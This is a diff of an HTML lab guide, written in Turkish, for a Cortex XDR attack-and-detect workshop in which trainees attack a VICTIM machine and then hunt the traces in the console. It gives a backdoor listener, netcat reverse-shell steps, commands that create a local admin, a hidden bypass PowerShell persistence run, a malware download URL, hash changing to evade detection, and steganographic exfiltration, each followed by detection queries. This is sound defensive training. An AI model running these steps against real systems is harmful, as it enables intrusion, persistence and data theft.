@@ -3,8 +3,8 @@
 <head>
 <meta charset="utf-8"/>
 <meta content="width=device-width, initial-scale=1" name="viewport"/>
-<title>Cortex XDR UTD Workshop Lab Rehberi</title>
-<meta content="Cortex XDR UTD - Attack &amp; Detect threat hunting workshop lab rehberi" name="description"/>
+<title>Cortex XDR Threat Hunting Workshop — Lab Rehberi</title>
+<meta content="Cortex XDR Threat Hunting Workshop — Attack &amp; Detect lab rehberi" name="description"/>
 <link href="https://fonts.googleapis.com" rel="preconnect"/>
 <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
 <link href="https://fonts.googleapis.com/css2?family=Figtree:ital,wght@0,400;0,600;0,700;1,400&amp;family=JetBrains+Mono:wght@400;500&amp;display=swap" rel="stylesheet"/>
@@ -113,8 +113,8 @@ footer b { color: var(--green-dk); }
 </style>
 </head>
 <body>
-<div class="print-credit">Cortex by Palo Alto Networks · XDR UTD Workshop · Lab Rehberi</div>
-<div class="banner"><b>Cortex XDR UTD</b><span>Attack &amp; Detect · Threat Hunting Workshop</span></div>
+<div class="print-credit">Cortex by Palo Alto Networks · Cortex XDR Threat Hunting Workshop · Lab Rehberi</div>
+<div class="banner"><b>Cortex XDR Threat Hunting Workshop</b><span>Attack &amp; Detect</span></div>
 <div class="layout">
 <aside class="side" id="side">
 <button aria-expanded="false" class="btn menu-btn" id="menuBtn" type="button">Bölümler <span aria-hidden="true">▾</span></button>
@@ -135,17 +135,17 @@ footer b { color: var(--green-dk); }
 <div class="side-links">
 <a class="btn" href="#" onclick="window.print();return false;">Yazdır / PDF</a>
 </div>
-<p class="side-credit">EO Cortex XDR UTD · V1.3-TR</p>
+<p class="side-credit">Cortex XDR Threat Hunting Workshop · V1.3-TR</p>
 </div>
 </aside>
 <main>
 <header class="hero">
-<h1>Cortex XDR UTD<br/>Attack &amp; Detect</h1>
-<p>Bir saldırıyı ATTACKER makinesinden yürütür, ürettiği izleri VICTIM üzerinde Cortex XDR ile avlarsınız. Backdoor, reverse shell, persistence, malware ve data exfiltration adımlarını hem çalıştırıp hem tespit edeceksiniz.</p>
+<h1>Cortex XDR<br/>Threat Hunting Workshop</h1>
+<p>Saldırıyı ATTACKER makinesinden siz çalıştırır, bıraktığı izleri VICTIM üzerinde Cortex XDR ile avlarsınız. Backdoor, reverse shell, persistence, malware ve data exfiltration adımlarının her birini önce yapıp sonra tespit edeceksiniz.</p>
 </header>
 
 <section class="sec" id="hakkinda"><h2 class="sec-title">Workshop Hakkında</h2>
-<p>Bu lab'da iki makine kullanırsınız: saldırıyı yürüttüğünüz <strong>ATTACKER</strong> ve hedef <strong>VICTIM</strong>. Cortex XDR agent'ı yalnızca VICTIM üzerinde çalışır; attacker'ın ürettiği aktiviteyi konsoldan avlarsınız. Makineler lab için önceden hazırlanmıştır: <code>C:\x_test</code> açılmış, araçlar yerinde, ATTACKER masaüstünde kendi VICTIM'ınızın IP'si hazırdır.</p>
+<p>Lab'da iki makineniz var: saldırıyı çalıştırdığınız <strong>ATTACKER</strong> ve hedef <strong>VICTIM</strong>. Cortex XDR agent yalnızca VICTIM'da çalışır; saldırının VICTIM'da bıraktığı aktiviteyi konsoldan avlarsınız. Makineler hazır geliyor: <code>C:\x_test</code> açılmış, araçlar yerinde ve ATTACKER masaüstünde kendi VICTIM'ınızın IP'si hazır.</p>
 <div class="table-wrap"><table><caption>Roller</caption>
 <thead><tr><th>Yer</th><th>Ne yapar</th></tr></thead>
 <tbody>
@@ -153,56 +153,56 @@ footer b { color: var(--green-dk); }
 <tr><td><span class="role role-vic">VICTIM</span></td><td>Hedef makine; XDR agent burada çalışır, backdoor burada dinler</td></tr>
 <tr><td><span class="role role-xdr">XDR KONSOL</span></td><td>Query Builder, BIOC, Causality Chain, Timeline ile avlama</td></tr>
 </tbody></table></div>
-<p class="note"><span class="note-tag">Not</span>ATTACKER masaüstündeki <strong>VICTIM-BILGISI.txt</strong> dosyasında kendi VICTIM makinenizin hostname'i, IP'si ve hazır <code>Client1.exe</code> komutu yazılıdır. IP aramayın, oradan kopyalayın.</p>
+<p class="note"><span class="note-tag">Not</span>ATTACKER masaüstündeki <strong>VICTIM-BILGISI.txt</strong> dosyasında kendi VICTIM makinenizin hostname'i, IP'si ve hazır <code>Client1.exe</code> komutu var. IP aramayla uğraşmayın, oradan kopyalayın.</p>
 <label class="done-toggle"><input data-done="hakkinda" type="checkbox"/> Bu bölümü tamamladım</label></section>
 
 <section class="sec" id="s0"><h2 class="sec-title">0. Hazırlık</h2>
-<p>Makinelere bağlanın, XDR konsoluna giriş yapın ve ortamın hazır olduğunu doğrulayın.</p>
+<p>İki makineye de bağlanın, XDR konsoluna girin ve ortamın hazır olduğunu doğrulayın.</p>
 <ul>
-<li><span class="role role-vic">VICTIM</span><span class="role role-atk">ATTACKER</span> Size verilen RDP adresleriyle her iki makineye de bağlanın.</li>
-<li><span class="role role-xdr">XDR KONSOL</span> Eğitmenin verdiği konsol adresine giriş yapın (masaüstündeki <strong>XDR Konsol</strong> kısayolu).</li>
-<li><span class="role role-vic">VICTIM</span> Agent'ın yeşil/çalışır olduğunu kontrol edin:</li>
+<li><span class="role role-vic">VICTIM</span><span class="role role-atk">ATTACKER</span> Size verilen RDP adresleriyle her iki makineye bağlanın.</li>
+<li><span class="role role-xdr">XDR KONSOL</span> Eğitmenin verdiği konsol adresine girin (masaüstündeki <strong>XDR Konsol</strong> kısayolu).</li>
+<li><span class="role role-vic">VICTIM</span> Agent'ın çalıştığını (yeşil) kontrol edin:</li>
 </ul>
 <div class="code"><pre id="c0a"><code>Get-Service | Where-Object { $_.DisplayName -like "*Cortex*" }</code></pre><button class="copy" data-target="c0a" type="button">Kopyala</button></div>
-<ul><li><span class="role role-xdr">XDR KONSOL</span> Endpoints → All Endpoints'te kendi VICTIM makinenizi hostname'iyle bulun. Makinenizde <strong>UTD</strong> tag'inin atalı olduğunu doğrulayın.</li></ul>
-<div class="callout"><span class="callout-tag">Beklenen sonuç</span><p>Her iki makineye bağlısınız, VICTIM'da agent çalışıyor ve konsolda kendi makinenizi görüyorsunuz.</p></div>
+<ul><li><span class="role role-xdr">XDR KONSOL</span> Endpoints → All Endpoints'te kendi VICTIM makinenizi hostname'iyle bulun ve üzerinde <strong>UTD</strong> tag'inin atandığını doğrulayın.</li></ul>
+<div class="callout"><span class="callout-tag">Beklenen sonuç</span><p>İki makineye de bağlısınız, VICTIM'da agent çalışıyor ve konsolda kendi makinenizi görüyorsunuz.</p></div>
 <label class="done-toggle"><input data-done="s0" type="checkbox"/> Bu bölümü tamamladım</label></section>
 
 <section class="sec" id="s1"><h2 class="sec-title">1. Initial Access</h2>
-<p>VICTIM üzerinde bir backdoor dinleyici başlatır, ATTACKER'dan ona bağlanırsınız.</p>
-<ul><li><span class="role role-vic">VICTIM</span> Backdoor listener'ı başlatın. Bu, aktif bağlantı kurmaz; yalnızca 8000 ve 8001 portlarında dinlemeye geçer:</li></ul>
+<p>Önce VICTIM'da backdoor'u dinlemeye alır, sonra ATTACKER'dan bağlanırsınız.</p>
+<ul><li><span class="role role-vic">VICTIM</span> Backdoor'u başlatın. Aktif bağlantı açmaz, sadece 8000 ve 8001 portlarında dinlemeye geçer:</li></ul>
 <div class="code"><pre id="c1a"><code>cd C:\x_test\server
 w_win.exe</code></pre><button class="copy" data-target="c1a" type="button">Kopyala</button></div>
-<ul><li><span class="role role-vic">VICTIM</span> Portların dinlendiğini doğrulayın (8000, 8001):</li></ul>
+<ul><li><span class="role role-vic">VICTIM</span> Portların dinlemede olduğunu doğrulayın (8000, 8001):</li></ul>
 <div class="code"><pre id="c1b"><code>netstat -nap tcp</code></pre><button class="copy" data-target="c1b" type="button">Kopyala</button></div>
 <ul><li><span class="role role-atk">ATTACKER</span> VICTIM'a bağlanın. <strong>IP için masaüstündeki VICTIM-BILGISI.txt</strong>'i kullanın:</li></ul>
 <div class="code"><pre id="c1c"><code>cd C:\x_test\client
 Client1.exe &lt;VICTIM-IP&gt; localhost</code></pre><button class="copy" data-target="c1c" type="button">Kopyala</button></div>
-<p class="indent">Komut sonrası CMD kapanır ve <code>client</code> klasöründe <code>index.html</code> oluşur. Bu dosya VICTIM'a erişim arayüzüdür.</p>
-<ul><li><span class="role role-atk">ATTACKER</span> <code>index.html</code>'i açın, sol üstteki <strong>TestMe</strong>'ye tıklayın. VICTIM'da çıkan pop-up'a OK deyin — erişim başarılı.</li></ul>
-<div class="callout"><span class="callout-tag">Beklenen sonuç</span><p>index.html portalı açık; sağ taraf VICTIM'daki dosyaları, sol taraf erişim yöntemlerini gösterir.</p></div>
+<p class="indent">Komuttan sonra CMD kendiliğinden kapanır ve <code>client</code> klasöründe bir <code>index.html</code> oluşur; VICTIM'a bu arayüzden erişeceksiniz.</p>
+<ul><li><span class="role role-atk">ATTACKER</span> <code>index.html</code>'i açıp sol üstteki <strong>TestMe</strong>'ye tıklayın. VICTIM'da çıkan pop-up'a OK deyin — erişim başarılı.</li></ul>
+<div class="callout"><span class="callout-tag">Beklenen sonuç</span><p>index.html portalı açılır; sağ tarafta VICTIM'daki dosyalar, sol tarafta kullanabileceğiniz erişim yöntemleri olur.</p></div>
 <label class="done-toggle"><input data-done="s1" type="checkbox"/> Bu bölümü tamamladım</label></section>
 
 <section class="sec" id="s2"><h2 class="sec-title">2. Persistency</h2>
-<p>Portal üzerinden dosya yükler, reverse shell alır, local admin oluşturur ve persistence kurarsınız.</p>
+<p>Portaldan dosya yükler, reverse shell alır, local admin açar ve persistence kurarsınız.</p>
 <ul>
-<li><span class="role role-atk">ATTACKER</span> index.html → <strong>File-Upload</strong> ile önce <code>downloader.ps1</code>, sonra <code>persistency.ps1</code>'i yükleyin. Yüklenen dosyalar VICTIM'da <code>C:\x_test\server\ud</code> altında görünür.</li>
-<li><span class="role role-atk">ATTACKER</span> Netcat dinleyici başlatın:</li>
+<li><span class="role role-atk">ATTACKER</span> index.html → <strong>File-Upload</strong> ile önce <code>downloader.ps1</code>, sonra <code>persistency.ps1</code>'i yükleyin. Yüklediğiniz dosyalar VICTIM'da <code>C:\x_test\server\ud</code> altında belirir.</li>
+<li><span class="role role-atk">ATTACKER</span> Netcat'i dinlemeye alın:</li>
 </ul>
 <div class="code"><pre id="c2a"><code>cd C:\x_test\client
 nc.exe -l -p 9999</code></pre><button class="copy" data-target="c2a" type="button">Kopyala</button></div>
-<ul><li><span class="role role-atk">ATTACKER</span> index.html → <strong>RevShell</strong>'e tıklayın ve <strong>ATTACKER makinenizin IP'sini</strong> girin. Komut VICTIM'da çalışır, shell ATTACKER'da açılır. Doğru makinede olduğunuzu kontrol edin:</li></ul>
+<ul><li><span class="role role-atk">ATTACKER</span> index.html → <strong>RevShell</strong>'e tıklayın ve <strong>ATTACKER makinenizin IP'sini</strong> girin. Komut VICTIM'da çalışır ama shell size, ATTACKER'a düşer. Doğru makinede olduğunuzu kontrol edin:</li></ul>
 <div class="code"><pre id="c2b"><code>hostname</code></pre><button class="copy" data-target="c2b" type="button">Kopyala</button></div>
-<ul><li><span class="role role-atk">ATTACKER</span> Reverse shell içinde local admin oluşturun:</li></ul>
+<ul><li><span class="role role-atk">ATTACKER</span> Reverse shell'de local admin açın:</li></ul>
 <div class="code"><pre id="c2c"><code>net user /add newadmin Password123
 net localgroup administrators newadmin /add</code></pre><button class="copy" data-target="c2c" type="button">Kopyala</button></div>
 <ul><li><span class="role role-atk">ATTACKER</span> Persistence kurun (scheduled task + startup):</li></ul>
 <div class="code"><pre id="c2d"><code>powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\x_test\server\ud\persistency.ps1</code></pre><button class="copy" data-target="c2d" type="button">Kopyala</button></div>
-<p class="indent">Çıktı olmaz. VICTIM'da <strong>Task Scheduler</strong>'da "Download 7Zip task" görünmelidir.</p>
+<p class="indent">Ekrana bir şey basmaz. VICTIM'da <strong>Task Scheduler</strong>'ı açınca "Download 7-Zip Task" görünür.</p>
 <label class="done-toggle"><input data-done="s2" type="checkbox"/> Bu bölümü tamamladım</label></section>
 
 <section class="sec" id="s3"><h2 class="sec-title">3. Threat Hunting: cmd → powershell</h2>
-<p>Saldırılarda sık görülen bir yöntem CMD'den PowerShell çağrılmasıdır. Bunu Query Builder ile bulup Causality ve Timeline ile inceleyeceksiniz.</p>
+<p>Saldırılarda sık rastlanan bir numara, PowerShell'i CMD üzerinden çağırmaktır. Bunu Query Builder'da yakalayıp Causality Chain ve Timeline ile inceleyeceksiniz.</p>
 <ul>
 <li><span class="role role-xdr">XDR KONSOL</span> Incident Response → Query Builder → <strong>Process</strong>. Şu alanları girin (HOST = kendi VICTIM makineniz):</li>
 </ul>
@@ -210,45 +210,45 @@ net localgroup administrators newadmin /add</code></pre><button class="copy" dat
 CMD ~= powershell        (~ tilde: "içerir")
 HOST = &lt;VICTIM hostname&gt;</code></pre><button class="copy" data-target="c3a" type="button">Kopyala</button></div>
 <ul>
-<li><span class="role role-xdr">XDR KONSOL</span> Sonuçlarda sağa kaydırıp <strong>SRC_</strong> alanlarına bakın: powershell'i cmd.exe'nin, onu da imzasız <code>w_win.exe</code>'nin çağırdığını görürsünüz.</li>
+<li><span class="role role-xdr">XDR KONSOL</span> Sonuçlarda sağa kaydırıp <strong>SRC_</strong> alanlarına bakın: powershell'i cmd.exe'nin, cmd.exe'yi de imzasız <code>w_win.exe</code>'nin çağırdığını görürsünüz.</li>
 <li><span class="role role-xdr">XDR KONSOL</span> persistency.ps1 satırında sağ tık → <strong>Investigate Causality Chain → Open Card in New Tab</strong>. cmd.exe → View Children → powershell.exe.</li>
 <li><span class="role role-xdr">XDR KONSOL</span> Description sütununu "task" ve "Startup" ile filtreleyerek scheduled task ve startup kayıtlarını görün.</li>
-<li><span class="role role-xdr">XDR KONSOL</span> powershell.exe → sağ tık → <strong>Investigate in Timeline</strong>. w_win.exe'nin portları (8000, 8001) ve netcat portu (9999) üzerine gelerek görünür.</li>
+<li><span class="role role-xdr">XDR KONSOL</span> powershell.exe → sağ tık → <strong>Investigate in Timeline</strong>. w_win.exe'nin dinlediği portlar (8000, 8001) ve netcat portu (9999), ilgili noktaların üzerine gelince görünür.</li>
 </ul>
 <label class="done-toggle"><input data-done="s3" type="checkbox"/> Bu bölümü tamamladım</label></section>
 
 <section class="sec" id="s4"><h2 class="sec-title">4. Credential Persistence (BIOC)</h2>
-<p><code>net.exe</code> kullanımı otomatik tespit edilmez; izlenmesi gereken bir aktivitedir. Bunun için bir BIOC kuralı yazarsınız.</p>
+<p><code>net.exe</code> kullanımı otomatik yakalanmaz; elle izlenmesi gereken bir aktivitedir. Bunun için bir BIOC kuralı yazacaksınız.</p>
 <ul>
 <li><span class="role role-xdr">XDR KONSOL</span> Detection Rules → BIOC → <strong>Add BIOC</strong> → Process. Şu alanları girip <strong>TEST</strong>'e basın:</li>
 </ul>
 <div class="code"><pre id="c4a"><code>NAME = net.exe
 CMD ~= user              (~ tilde: "içerir")
 HOST = &lt;VICTIM hostname&gt;</code></pre><button class="copy" data-target="c4a" type="button">Kopyala</button></div>
-<p class="warn"><span class="warn-tag">Dikkat</span>HOST_NAME girmezseniz tüm ortam için ortak alarm üretilir. Mutlaka kendi VICTIM makinenizi yazın.</p>
+<p class="warn"><span class="warn-tag">Dikkat</span>HOST girmezseniz kural tüm ortam için alarm üretir. Mutlaka kendi VICTIM makinenizi yazın.</p>
 <aside class="task"><div class="task-tag">Sıra sizde!</div><ul>
 <li><code>net user</code> komutunu kim çalıştırdı?</li>
 <li>Hangi process <code>net user</code>'ı tetikledi?</li>
 </ul></aside>
-<ul><li><span class="role role-xdr">XDR KONSOL</span> Sağ üstte <strong>Save</strong>. Kural kaydedildikten sonra son 30 günün ilgili aktiviteleri incident olarak Incident Response → Incident View altında görünür.</li></ul>
+<ul><li><span class="role role-xdr">XDR KONSOL</span> Sağ üstten <strong>Save</strong>. Kaydettikten sonra son 30 gündeki ilgili aktiviteler incident olarak Incident Response → Incident View altına düşer.</li></ul>
 <label class="done-toggle"><input data-done="s4" type="checkbox"/> Bu bölümü tamamladım</label></section>
 
 <section class="sec" id="s5"><h2 class="sec-title">5. Malware: WildFire &amp; Local Analysis</h2>
-<p>Ortamın malware'i nasıl yakaladığını, hash değişince hangi modülün devreye girdiğini görürsünüz. Dosyada zararlı içerik yoktur; yalnızca keşif amaçlıdır.</p>
+<p>Ortamın bir malware'i nasıl yakaladığını, hash değişince hangi modülün devreye girdiğini göreceksiniz. Dosyada zararlı bir şey yok, sadece tespit amaçlı.</p>
 <ul>
 <li><span class="role role-atk">ATTACKER</span> index.html → <strong>URL (Download)</strong> alanına şunu yazıp Submit edin:</li>
 </ul>
 <div class="code"><pre id="c5a"><code>http://www.torsque.com/malware1.exe</code></pre><button class="copy" data-target="c5a" type="button">Kopyala</button></div>
 <ul>
 <li><span class="role role-atk">ATTACKER</span> Sayfayı yenileyin, sağda oluşan dosya adını kopyalayın. <strong>Execute (binary)</strong> → File path alanına <code>ud\dosyaadi.ud</code> yazıp çalıştırın.</li>
-<li><span class="role role-vic">VICTIM</span> XDR agent → <strong>EVENT</strong> sekmesi. Dosyanın <strong>WildFire</strong> ile (hash reputation, çalıştırılmadan) yakalandığını görün.</li>
+<li><span class="role role-vic">VICTIM</span> XDR agent → <strong>EVENT</strong> sekmesi. Dosyanın <strong>WildFire</strong> ile yakalandığını görün — hash reputation'dan, çalıştırmaya bile gerek kalmadan.</li>
 <li><span class="role role-atk">ATTACKER</span> index.html → <strong>ChangeHash</strong> → aynı dosya adını girin. Aynı dosya yeni hash'le üretilir. Yenileyip yeni adı <strong>Execute (binary)</strong> ile çalıştırın.</li>
-<li><span class="role role-vic">VICTIM</span> EVENT sekmesinde bu kez dosyanın <strong>Local Analysis</strong> ile yakalandığını görün (hash değiştiği için reputation tutmadı).</li>
+<li><span class="role role-vic">VICTIM</span> EVENT sekmesinde dosyanın bu kez <strong>Local Analysis</strong> ile yakalandığını görün — hash değiştiği için reputation tutmadı.</li>
 </ul>
 <label class="done-toggle"><input data-done="s5" type="checkbox"/> Bu bölümü tamamladım</label></section>
 
 <section class="sec" id="s6"><h2 class="sec-title">6. Network Source Avı</h2>
-<p>malware1.exe'nin nereden indiğini bulursunuz. Bir dosyanın makineye ulaştığı ilk an dosya sistemindeki <strong>create</strong> işlemidir; oraya odaklanırsınız.</p>
+<p>malware1.exe'nin nereden indiğini bulacaksınız. Bir dosya makineye ilk ulaştığında dosya sisteminde bir <strong>create</strong> işlemi olur; avı oradan başlatırsınız.</p>
 <ul>
 <li><span class="role role-xdr">XDR KONSOL</span> Incident → Query Builder → <strong>File</strong>, üstten yalnızca <strong>Create</strong> seçin:</li>
 </ul>
@@ -256,23 +256,23 @@ HOST = &lt;VICTIM hostname&gt;</code></pre><button class="copy" data-target="c4a
 HOST = &lt;VICTIM hostname&gt;</code></pre><button class="copy" data-target="c6a" type="button">Kopyala</button></div>
 <ul>
 <li><span class="role role-xdr">XDR KONSOL</span> İlgili kayıtta sağ tık → <strong>Investigate Causality Chain → Open card in New Tab</strong>.</li>
-<li><span class="role role-xdr">XDR KONSOL</span> <code>w_win.exe</code> → sağ tık → <strong>Investigate in Timeline</strong>. Outgoing Connection aktivitelerinde <code>www.torsque.com</code>'a yapılan istek ve hemen ardından çalışan process görünür.</li>
+<li><span class="role role-xdr">XDR KONSOL</span> <code>w_win.exe</code> → sağ tık → <strong>Investigate in Timeline</strong>. Outgoing Connection aktivitelerinde <code>www.torsque.com</code>'a giden istek ve hemen ardından çalışan process görünür.</li>
 </ul>
 <label class="done-toggle"><input data-done="s6" type="checkbox"/> Bu bölümü tamamladım</label></section>
 
 <section class="sec" id="s7"><h2 class="sec-title">7. Data Exfiltration</h2>
-<p>Cortex XDR, dosya tipinden bağımsız davranışları kaydeder — JPEG veya uzantısız dosyalar dahil. w_win.exe'nin okuduğu/oluşturduğu dosyaları avlarsınız.</p>
+<p>Cortex XDR, dosya tipinden bağımsız olarak davranışı kaydeder — JPEG ya da uzantısız dosyalar dahil. Burada w_win.exe'nin okuduğu ve oluşturduğu dosyaları avlarsınız.</p>
 <ul>
-<li><span class="role role-atk">ATTACKER</span> index.html → <strong>Steganography</strong>. Command alanına <code>hostname</code> yazıp Submit edin; oluşan dosya adını not alın. (İsterseniz <strong>Screenshot</strong> da deneyin.) Steganografi, veriyi masum görünen bir JPEG içine gizler.</li>
+<li><span class="role role-atk">ATTACKER</span> index.html → <strong>Steganography</strong>. Command alanına <code>hostname</code> yazıp Submit edin; oluşan dosya adını not alın. (İsterseniz <strong>Screenshot</strong> da deneyin.) Steganografi, veriyi masum görünümlü bir JPEG'in içine saklar.</li>
 <li><span class="role role-xdr">XDR KONSOL</span> Incident Response → Query Builder → <strong>File</strong>. File Activity'de <strong>Create</strong> + <strong>Read</strong> seçin, Process NAME'e <code>w_win.exe</code> yazın:</li>
 </ul>
 <div class="code"><pre id="c7a"><code>Process NAME = w_win.exe
 File Activity = Create + Read</code></pre><button class="copy" data-target="c7a" type="button">Kopyala</button></div>
-<p class="indent">w_win.exe'nin oluşturduğu ve okuduğu dosyaları birlikte görürsünüz — exfiltration'ın dosya izi budur.</p>
+<p class="indent">w_win.exe'nin oluşturduğu ve okuduğu dosyaları bir arada görürsünüz — exfiltration'ın dosya izi budur.</p>
 <div class="callout"><span class="callout-tag">Tebrikler</span><p>Saldırının her aşamasını hem çalıştırdınız hem de Cortex XDR ile avladınız.</p></div>
 <label class="done-toggle"><input data-done="s7" type="checkbox"/> Bu bölümü tamamladım</label></section>
 
-<footer><b>Cortex XDR UTD — Attack &amp; Detect</b> · Lab Rehberi V1.3-TR · UD Tool: Usman Durrani · UTD design: Erdem Ocal</footer>
+<footer><b>Cortex XDR Threat Hunting Workshop</b> · Attack &amp; Detect · Lab Rehberi V1.3-TR · UD Tool: Usman Durrani · UTD design: Erdem Ocal</footer>
 </main>
 </div>
 <script>
